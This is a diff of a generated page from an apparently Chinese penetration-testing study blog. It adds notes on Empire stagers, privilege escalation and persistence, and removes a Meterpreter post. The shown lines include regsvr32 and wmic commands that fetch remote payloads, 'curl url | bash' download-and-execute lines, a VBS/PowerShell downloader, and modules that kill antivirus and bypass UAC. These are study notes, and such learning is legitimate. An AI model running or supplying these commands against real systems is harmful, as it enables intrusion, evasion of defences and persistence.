@@ -64,6 +64,70 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-empire提权和持久化" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" class="article-date">
+  <time datetime="2021-08-21T13:28:18.000Z" itemprop="datePublished">2021-08-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/">empire提权和持久化</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="stager的几种用法"><a href="#stager的几种用法" class="headerlink" title="stager的几种用法"></a>stager的几种用法</h2><p>windows/launcher_sct</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;n &#x2F;i:http:&#x2F;&#x2F;192.168.1.135&#x2F;launcher.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">scrobj.dll: 固定的</span><br></pre></td></tr></table></figure>
+
+<p>windows/launcher_vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行: Cscript launcher.vbs</span><br></pre></td></tr></table></figure>
+
+<p>windows/launcher_xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行:</span><br><span class="line">cd C:\Windows\Microsoft.NET\Framework\v4.0.30319</span><br><span class="line">.\MSBuild.exe C:\users\一瓢饮\Desktop\la.xml</span><br></pre></td></tr></table></figure>
+
+<p>windows/wmic</p>
+<p>wmic调用: wmic process call create <code>calc</code> –&gt; command</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行: wmic os get &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.1.135&#x2F;la.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+<p>windows/macro</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. word 选项 --&gt; 信任中心 --&gt; 宏设置 --&gt; 启用所有宏</span><br><span class="line">2. 开发工具 --&gt; 宏 --&gt; 创建(所有活动模板和文档) --&gt; templateProject --&gt; microsoft word 对象 --&gt; thisdocment --&gt; 插入宏代码(VBA)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>github | 码云(gitee)</p>
+<p>利用uac</p>
+<p>绕过uac</p>
+<p>本地提权: 漏洞查找 –&gt; <code>powershell/privesc/sherlock</code> | <code>widnows-suggester-exploit.py</code></p>
+<p>powerup</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks 检测是否可以利用powerup漏洞</span><br><span class="line"></span><br><span class="line"># 要检测的事情</span><br><span class="line">[*] Checking if user is in a local group with administrative privileges... </span><br><span class="line"># 探测结果</span><br><span class="line">[+] User is in a local group that grants administrative privileges!</span><br><span class="line"># 利用方式</span><br><span class="line">[+] Run a BypassUAC attack to elevate privileges to admin.</span><br></pre></td></tr></table></figure>
+
+<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>debugger代码修改:</p>
+<p>136-139 用 ‘’’ ‘’’包裹注释</p>
+<p>180按一下tab键对齐</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckv7qjzs8000bnovjh32x7mbe" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-empire基操" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/" class="article-date">
@@ -124,7 +188,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckv3dvtw5000cfcvje02c07cc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckv7qjzs3000anovjb5dx0s0o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -181,7 +245,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckv3dvtwf000tfcvjcc4q4mnj" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckv7qjzso000tnovj6ymi2ngn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -247,7 +311,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="ckv3dvtwe000qfcvj3ln80a6k" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="ckv7qjzso000snovjdew24dx3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -329,7 +393,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="ckv3dvtwe000rfcvjfi9sc2v4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="ckv7qjzsn000rnovjac6nav3h" class="article-share-link">Share</a>
       
       
     </footer>
@@ -403,7 +467,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckv3dvtw20007fcvjese68jkk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckv7qjzsa000cnovj9u79arqg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -474,7 +538,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckv3dvtw8000ffcvj1r1bdghu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckv7qjzsc000enovjgk3t6w9o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -542,7 +606,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckv3dvtw7000efcvj08mz10on" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckv7qjzsd000fnovj4ni42g46" class="article-share-link">Share</a>
       
       
     </footer>
@@ -613,7 +677,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckv3dvtwc000mfcvj0nvy354r" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckv7qjzsk000mnovj47j4adje" class="article-share-link">Share</a>
       
       
     </footer>
@@ -699,66 +763,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckv3dvtwc000nfcvj5p8ygrbh" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-meterpreter与提权" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" class="article-date">
-  <time datetime="2021-07-24T01:09:21.000Z" itemprop="datePublished">2021-07-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/">meterpreter与提权</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="远程下载文件"><a href="#远程下载文件" class="headerlink" title="远程下载文件"></a>远程下载文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">wget URL</span><br><span class="line">curl URL -o output_file_name</span><br><span class="line">无文件传输:</span><br><span class="line">wget -qO - url | bash</span><br><span class="line">curl url | bash</span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">vbs:</span><br><span class="line">set post &#x3D; CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">set shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;server_ip&#x2F;fileName(要下载的文件）&quot;,0</span><br><span class="line">Post.send()</span><br><span class="line">set aGET &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGET.Mode &#x3D; 3</span><br><span class="line">aGET.Type &#x3D; 1</span><br><span class="line">aGET.Open()</span><br><span class="line">aGET.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;路径+要保存的名字 (c:\xx.exe)&quot;,2</span><br><span class="line">执行: cscript xxx.vbs</span><br><span class="line"></span><br><span class="line">powershell:</span><br><span class="line">powershell -exec bypass -c (New-Object System.Net.WebClient).DownloadFile(&#39;URL&#x2F;文件名&#39;,&#39;要保存的路径&#x2F;文件名&#39;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>后渗透模块:POST    </p>
-<p>漏洞探测:    </p>
-<p>​        应用漏洞{版本漏洞,应用本身的缺陷….}</p>
-<p>​        服务漏洞{基于端口、基于系统服务…}</p>
-<p>​        系统内核漏洞{提权,cve-2018-8120}</p>
-<p>后渗透模块:</p>
-<p>​    <strong>show post</strong>                                            查看post模块</p>
-<p>​    run windows/manage/killav        关闭杀软</p>
-<p>​    windows/manage/enable_rdp    开放3389,(需要特权)</p>
-<p>​    ….</p>
-<p><strong>提权:</strong></p>
-<p>​        uac提权:      user account control 用户账户控制</p>
-<p>​                    exploit/windows/local/ask</p>
-<p>​                    参数:name,<code>session</code></p>
-<p>​        bypassuac:</p>
-<p>​                    exploit/windows/local/bypassuac_eventvwr</p>
-<p>​                    exploit/windows/local/bypassuac_comhijack </p>
-<p>​                    exploit/windows/local/bypassuac_injection</p>
-<p>​                    exploit/windows/local/bypassuac_windows_store_filesys</p>
-<p>​    本地提权漏洞:</p>
-<p>​                    cve-2018-8120:exploit/windows/local/ms18_8120_win32k_privesc</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckv3dvtw8000gfcvj15v94xeu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckv7qjzsk000nnovjf74za9h7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -804,6 +809,10 @@ shellcode: 机器码(二进制,十六进制)
       <ul>
         
           <li>
+            <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
           </li>
         
@@ -817,10 +826,6 @@ shellcode: 机器码(二进制,十六进制)
         
           <li>
             <a href="/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/">文件上传漏洞的利用和验证过滤</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/">sql漏洞注入扩展和Access数据库</a>
           </li>
         
       </ul>
